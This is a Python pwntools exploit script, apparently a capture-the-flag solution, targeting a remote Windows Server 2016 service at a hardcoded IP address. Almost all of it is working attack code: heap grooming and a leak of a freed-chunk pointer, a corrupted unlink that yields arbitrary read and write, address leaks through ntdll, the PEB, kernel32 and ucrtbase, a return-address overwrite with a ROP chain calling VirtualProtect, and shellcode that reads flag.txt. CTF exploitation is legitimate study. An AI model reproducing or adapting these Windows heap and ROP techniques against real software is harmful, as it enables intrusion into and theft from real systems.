#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *
import sys
import re

#context.log_level = 'debug'
context.arch = 'amd64'
# remote environment is on AWS windows server 2016 14393 updated
r = remote('13.231.142.96', 6677)

human_kind = {'teacher':1, 'engineer':2, 'doctor':3, 'athlete':4, 'pig':5}
def create(age, name, kind, *args):
  r.sendlineafter('>>', 'create')
  r.sendline(str(age))
  r.sendline(name)
  r.sendline(str(human_kind[kind]))
  for i in args:
    r.sendline(i)

def list_():
  r.sendlineafter('>>', 'list')
  return r.recvuntil('Athlete')

def leak():
  buf = list_()
  blink = re.search('Engineer AAAAAAAA(.*)\(2\)', buf).group(1)
  blink = u64(blink.ljust(8, '\x00'))
  return blink

def edit(kind, name, s):
  r.sendlineafter('>>', 'edit')
  r.sendline(str(human_kind[kind]))
  r.sendline(name)
  r.sendline(s)

## defragment freelist
# it seems that size > 0x200 is `safe` (LFH-disabled)
# ps. the vector size is expanded as [0x40,0x70,0xa0,0xd0,0x130,0x130,0x1c0*3,0x280*4,0x3a0,...,0x550,...]
for i in range(10):
  create(1, '1', 'teacher', '1', 'subject')
for i in range(10):
  create(1, '1', 'doctor', '1', 'hospital')
for i in range(10):
  create(1, '1', 'athlete', '1', 'sport')
for i in range(10):
  if i == 0:
    create(2, 'AAAAAAAA', 'engineer', '1', '1', '') # for leak
  else:
    create(2, 'A'+str(i), 'engineer', '1', '1', '')
for i in range(7): # fill the freed vector
  create(1, '1', 'pig', '1', '1', '1')
# current heap layout
#        0000029ee4cc5750: 00810 . 00280 [101] - busy (270) # vector<doctor>
#        0000029ee4cc59d0: 00280 . 00280 [101] - busy (270) # vector<athlete>
#        0000029ee4cc5c50: 00280 . 00280 [101] - busy (270) # vector<engineer>
#        0000029ee4cc5ed0: 00280 . 010f0 [100]              # end

## leak blink and locate vector<engineer>
for i in range(4+6):
  create(2, 'A'+str(i+10), 'engineer', '1', '1', '')
# vecotr<engineer> expand 2 times here
# for first time
#        0000029ee4cc5750: 00810 . 00280 [101] - busy (270)
#        0000029ee4cc59d0: 00280 . 00280 [101] - busy (270)
#        0000029ee4cc5c50: 00280 . 00280 [100] 			# freed old vector
#        0000029ee4cc5ed0: 00280 . 003a0 [101] - busy (390) 	# allocated new vector
#        0000029ee4cc6270: 003a0 . 00d50 [100] 			# blink = 0000029ee4cc5c60
#                                                               since largest chunk blink points to second large
#                                                               the freed old vector should be the second large due to the previous defragment
# for second time
#        0000029ee4cc5750: 00810 . 00280 [101] - busy (270)
#        0000029ee4cc59d0: 00280 . 00280 [101] - busy (270)
#        0000029ee4cc5c50: 00280 . 00620 [100] 			# freed old vector (0x280+0x3a0)
#        0000029ee4cc6270: 00620 . 00550 [101] - busy (540) 	# allocated new vector
#                                                               engineer->name is not NULL-byte terminated
#                                                               it can leak the following uninitialize part, which is the previous blink (0000029ee4cc5c60)
#        0000029ee4cc67c0: 00550 . 00800 [100]

blink = leak()
assert blink != 0, 'maybe address end with 0x00'
vector = blink+0x620
print 'vector<engineer> @', hex(vector)

## prepare dangling pointer
N = 10
for i in range(1,N+1):
  edit('engineer', 'A'+str(i), 'BBBBBBBB')
edit('engineer', 'A'+str(N-3), '') # A7
edit('engineer', 'A'+str(N-1), '') # A9, it places in ListHints instead of A7 in order to prevent assertion in RtlpFreeHeap, explained in unlink_chunk.cpp
dangling = vector+0x30*(N-3)+0x18
print 'dangling @', hex(dangling)
# current heap layout
#        0000029ee4cc6ee0: 00260 . 00260 [101] - busy (250) 	# A6
#        0000029ee4cc7140: 00260 . 00260 [100] 			# A7
#        0000029ee4cc73a0: 00260 . 00260 [101] - busy (250) 	# A8
#        0000029ee4cc7600: 00260 . 00260 [100] 			# A9
#        0000029ee4cc7860: 00260 . 00260 [101] - busy (250) 	# A10
#        0000029ee4cc7ac0: 00260 . 00500 [100]                  # end 

# overwrite A7 flink/blink
edit('engineer', 'A'+str(N-3), p64(dangling-8)+p64(dangling))
# free A6 and trigger unlink
edit('engineer', 'A'+str(N-4), '') # some un-reliable here
# now, engineer->language = &engineer->language
# it leads to arbitrary read(overwrite engineer->title)/write(overwrite engineer->language)
# struct engineer {
# +0  	name
# +0x10 age
# +0x18 language
# +0x20 title
# +0x28 salary
# };

def read(addr):
  d = p64(dangling)+p64(addr)
  assert '\x0a' not in d, 'orz'
  edit('engineer', 'A'+str(N-3), p64(dangling)+p64(addr))
  buf = list_()
  return re.search('Engineer A'+str(N-3)+'\(2\) was promoted as (.*), his salary', buf).group(1)

def read_len(addr, n):
  buf = ''
  while len(buf) < n:
    buf += read(addr+len(buf))
    buf += '\x00'
  return buf[:n]

# leak stack, some hardcode is from remote
heap = vector&~0xFFFF
for i in range(0x10):
  if read(heap+0x10)[:4] == '\xee\xff\xee\xff':
    break
  heap = heap-0x10000
else:
  print 'heap not found'
  quit()
print 'heap @', hex(heap)
ntdll = u64(read_len(heap+0x2a0, 8))-0x150d50 # _HEAP_LOCK
print 'ntdll @', hex(ntdll)
peb = u64(read_len(ntdll+0x1512D8, 8))-0x240
print 'peb @', hex(peb)
image = u64(read_len(peb+0x10, 8))
print 'image @', hex(image)
kernel32 = u64(read_len(image+0x6028, 8)) - 0x16630 # GetLastError
print 'kernel32 @', hex(kernel32)
kernelbase = u64(read_len(kernel32+0x75550, 8)) - 0x33bd0 # GetLastError
print 'kernelbase @', hex(kernelbase)
uef = u64(read_len(kernelbase+0x1EFC20, 8)) # BasepFilterInfo, credit to j00ru
stack = u64(read_len(uef+0x1c0, 8))
print 'stack @', hex(stack)
ucrtbase = u64(read_len(image+0x60e0, 8)) - 0x1080 # atoi
print 'ucrtbase @', hex(ucrtbase)

ret = stack
for i in range(0x800/0x8):
  sys.stdout.write('.')
  if read(ret)[:2] == '\x88\x42':
    break
  ret = ret + 0x8
else:
  print 'return address not found'
  quit()
print '\nreturn address @', hex(ret)

def write(addr, payload):
  assert '\n' not in p64(addr), 'orz'
  edit('engineer', 'A'+str(N-3), p64(addr))
  assert '\n' not in payload, 'orz'
  edit('engineer', 'A'+str(N-3), payload)

# overwrite return address
pop_rsp = ntdll+0x11017 # pop rsp ; ret
write(ret, flat(pop_rsp, ret-0x1a0))

# fix heap, credit to j00ru
virtualprotect = kernel32+0x1bc20
heapcreate = kernel32+0x1f490
sleep = kernel32+0x16640
_open = ucrtbase+0x6bf10
_read = ucrtbase+0x56c0
_write = ucrtbase+0x7850
crt_heap = ucrtbase+0xe65c8
p4_ret = ntdll+0x95ea0 # pop rdx ; pop rcx ; pop r8 ; pop r9 ; ret
p2_ret = p4_ret+2
flag_addr = ret+0x60-0x1a0
d = flat(
        0,p4_ret,0x1000,ret&~0xFFF,0x40,ret+8,
        virtualprotect,
        p4_ret,0,0,0,0,
        p2_ret,"flag.txt",0,
        ret+0x78-0x1a0
        )
sc = asm('''
sub rsp, 0x80

heapcreate:
xor rcx, rcx
xor rdx, rdx
xor r8, r8
xor r9, r9
mov cl, 2
mov rax, {}
call rax

fix_heap:
mov rbx, {}
mov [rbx], rax

open_file:
mov rcx, {}
mov rax, {}
call rax

read_file:
mov rcx, rax
mov rdx, {}
mov rax, {}
call rax

write_file:
mov r8, rax
xor rcx, rcx
inc rcx
mov rdx, {}
mov rax, {}
call rax

mov rax, {}
call rax
'''.format(heapcreate, crt_heap, flag_addr, _open, ret+8, _read, ret+8, _write, sleep))
d += sc
r.sendline(d)
print r.recvuntil('}')
